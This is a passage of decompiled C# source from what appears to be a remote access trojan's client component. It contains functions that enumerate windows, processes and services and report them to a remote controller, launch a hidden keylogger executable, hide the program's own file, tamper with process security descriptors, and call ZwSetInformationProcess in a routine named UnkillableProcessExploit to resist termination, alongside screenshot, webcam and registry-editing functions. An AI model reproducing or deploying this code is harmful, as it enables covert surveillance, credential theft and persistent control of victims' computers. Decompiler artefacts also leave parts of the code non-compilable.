                        str = str + current.InternalClient + @"\1\" + current.Protocol + @"\1\" + Conversions.ToString(current.ExternalPort) + @"\1\" + current.Description + @"\2\";
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
                Socketss.ListDataSend.Add(new Data("UPNP|S|" + str, null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("UPNP|S|ER", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void RefrshWindow()
        {
            try
            {
                WindowsString = string.Empty;
                WindowsList = new WindowsClass(Funzioni.GetWindowData);
                EnumWindows(WindowsList, 0);
                Socketss.ListDataSend.Add(new Data("ReW|S|" + WindowsString.Trim(), null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void RemoveUnlockPORT(string cases1, string cases2)
        {
            try
            {
                Mapping.Remove(Conversions.ToInteger(cases1), cases2);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("UPNP|S|ER", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void RestartServer()
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                Application.DoEvents();
            Label_0011:
                num3 = 3;
                Socketss.SendThrea.Abort();
            Label_001E:
                num3 = 4;
                Socketss.SendThrea = new Thread(new ThreadStart(Socketss.Send));
            Label_0036:
                num3 = 5;
                Socketss.SendThrea.IsBackground = false;
            Label_0044:
                num3 = 6;
                if (Socketss.client == null)
                {
                    goto Label_0077;
                }
            Label_0057:
                num3 = 7;
                Socketss.client.Client.Close();
            Label_0069:
                num3 = 8;
                Socketss.client.Close();
            Label_0077:
                num3 = 10;
                Socketss.client = null;
            Label_0080:
                num3 = 11;
                Thread.Sleep(300);
            Label_008E:
                num3 = 12;
                if (!SplitFunzioni.ThreadD.IsAlive)
                {
                    goto Label_00AF;
                }
            Label_00A1:
                num3 = 13;
                SplitFunzioni.ThreadD.Abort();
            Label_00AF:
                num3 = 15;
                if (!SplitFunzioni.ThreadDownoload.IsAlive)
                {
                    goto Label_00D0;
                }
            Label_00C2:
                num3 = 0x10;
                SplitFunzioni.ThreadDownoload.Abort();
            Label_00D0:
                num3 = 0x12;
                SplitFunzioni.MemorySFile = null;
            Label_00D9:
                num3 = 0x13;
                SplitFunzioni.tx.Abort();
            Label_00E7:
                num3 = 20;
                SplitFunzioni.Desktopx = null;
            Label_00F0:
                num3 = 0x15;
                SplitFunzioni.Webcamx = new WebCam();
            Label_00FD:
                num3 = 0x16;
                SplitFunzioni.EndDesk = true;
            Label_0106:
                num3 = 0x17;
                Thread thread = new Thread(new ParameterizedThreadStart(Funzioni._Lambda$__2));
            Label_011B:
                num3 = 0x18;
                thread.SetApartmentState(ApartmentState.STA);
            Label_0126:
                num3 = 0x19;
                thread.Start(GetCPU());
            Label_0135:
                num3 = 0x1a;
                SplitFunzioni.RestartThread = new Thread(new ThreadStart(Funzioni.RestartServer));
                goto Label_0217;
            Label_0159:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0011;

                    case 4:
                        goto Label_001E;

                    case 5:
                        goto Label_0036;

                    case 6:
                        goto Label_0044;

                    case 7:
                        goto Label_0057;

                    case 8:
                        goto Label_0069;

                    case 9:
                    case 10:
                        goto Label_0077;

                    case 11:
                        goto Label_0080;

                    case 12:
                        goto Label_008E;

                    case 13:
                        goto Label_00A1;

                    case 14:
                    case 15:
                        goto Label_00AF;

                    case 0x10:
                        goto Label_00C2;

                    case 0x11:
                    case 0x12:
                        goto Label_00D0;

                    case 0x13:
                        goto Label_00D9;

                    case 20:
                        goto Label_00E7;

                    case 0x15:
                        goto Label_00F0;

                    case 0x16:
                        goto Label_00FD;

                    case 0x17:
                        goto Label_0106;

                    case 0x18:
                        goto Label_011B;

                    case 0x19:
                        goto Label_0126;

                    case 0x1a:
                        goto Label_0135;

                    case 0x1b:
                        goto Label_0217;

                    default:
                        goto Label_020C;
                }
            Label_01D2:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_020C;

                    case 1:
                        goto Label_0159;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_01D2;
            }
        Label_020C:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0217:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        public static void ServiceExecuteCommand(int Indexb, int Command)
        {
            try
            {
                ServiceController.GetServices()[Indexb].ExecuteCommand(Command);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void ServicesPausa(int Index)
        {
            try
            {
                ServiceController.GetServices()[Index].Pause();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private static void SetHiddenAttrib()
        {
            try
            {
                File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                byte[] binaryForm = new byte[(dacl.BinaryLength - 1) + 1];
            Label_001B:
                num3 = 3;
                dacl.GetBinaryForm(binaryForm, 0);
            Label_0026:
                num3 = 4;
                if (!Win32.SetKernelObjectSecurity(processHandle, 4, binaryForm))
                {
                }
                goto Label_00AC;
            Label_003F:;
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_001B;

                    case 4:
                        goto Label_0026;

                    case 5:
                    case 6:
                        goto Label_00AC;

                    default:
                        goto Label_00A1;
                }
            Label_0067:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_00A1;

                    case 1:
                        goto Label_003F;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0067;
            }
        Label_00A1:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_00AC:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        [DllImport("user32", EntryPoint="SetWindowTextA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern bool SetWindowText(IntPtr H, [MarshalAs(UnmanagedType.VBByRefStr)] ref string STRG);
        public static Image shot(short Width, short Height, [Optional, DefaultParameterValue(true)] bool CompressImage, [Optional, DefaultParameterValue(50)] short Level)
        {
            if (CompressImage)
            {
                Size size = new Size(Width, Height);
                return CodecDesktop.VaryQualityLevel(Desktop(), size, Level);
            }
            return Desktop();
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern bool ShowWindow(IntPtr H, int IND);
        public static void StartKey()
        {
            try
            {
                Process process = new Process();
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.FileName = SplitFunzioni.KeyloggherExePatch;
                process.Start();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void StartServicesF(int Index)
        {
            try
            {
                ServiceController.GetServices()[Index].Start();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void StopServices(int Index)
        {
            try
            {
                ServiceController.GetServices()[Index].Stop();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void SubKeysChangeValue(string Patch, string Name, string Data)
        {
            try
            {
                MyProject.Computer.Registry.SetValue(Patch, Name, Data);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("RegER|S|Error during set value", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void SubKeysCreateValue(string Path, string Name, string Data, string HoldName)
        {
            try
            {
                MyProject.Computer.Registry.SetValue(Path, Name, Data);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("RegER|S|Error during create your custom key", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void TaskList()
        {
            string str;
            int num = 0;
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    short id;
                    int num2 = controllaproc(process.ProcessName, process.MainWindowTitle);
                    try
                    {
                        id = (short) process.Id;
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                    str = str + process.ProcessName + "|P|" + Conversions.ToString((int) id) + "|P|" + Conversions.ToString(num2) + "|PT|";
                    num++;
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    ProjectData.ClearProjectError();
                }
                Thread.Sleep(1);
            }
            Socketss.ListDataSend.Add(new Data("Task|S|" + str, null, null));
        }

        public static void UnkillableProcessExploit()
        {
            Win32.ZwSetInformationProcess(Win32.GetCurrentProcess(), (IntPtr) 0x21L, (IntPtr) VarPtr(-2147421911), (IntPtr) 4L);
        }

        public static void UnProtectProcess()
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                IntPtr currentProcess = Win32.GetCurrentProcess();
            Label_0012:
                num3 = 3;
                RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
            Label_001C:
                num3 = 4;
                processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessAllowed, 0x1f0fff, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
            Label_0041:
                num3 = 5;
                SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
                goto Label_00BF;
            Label_0054:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0012;

                    case 4:
                        goto Label_001C;

                    case 5:
                        goto Label_0041;

                    case 6:
                        goto Label_00BF;

                    default:
                        goto Label_00B4;
                }
            Label_0079:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_00B4;

                    case 1:
                        goto Label_0054;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0079;
            }
        Label_00B4:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_00BF:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        private static int VarPtr(object e)
        {
            GCHandle handle = GCHandle.Alloc(RuntimeHelpers.GetObjectValue(e), GCHandleType.Pinned);
            int num = handle.AddrOfPinnedObject().ToInt32();
            handle.Free();
            return num;
        }

        public static bool Watcher()
        {
            new Thread(new ThreadStart(Funzioni._Lambda$__3)).Start();
            return (Environment.GetCommandLineArgs().Length < 2);
        }

        public static void WindowEdit(int Index, string Title, int cases)
        {
            try
            {
                switch (cases)
                {
                    case 0:
                        SetWindowText((IntPtr) Index, ref Title);
                        return;

                    case 1:
                        ShowWindow((IntPtr) Index, Conversions.ToInteger(Title));
                        return;
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public delegate bool WindowsClass(IntPtr H, IntPtr hh);
    }
}

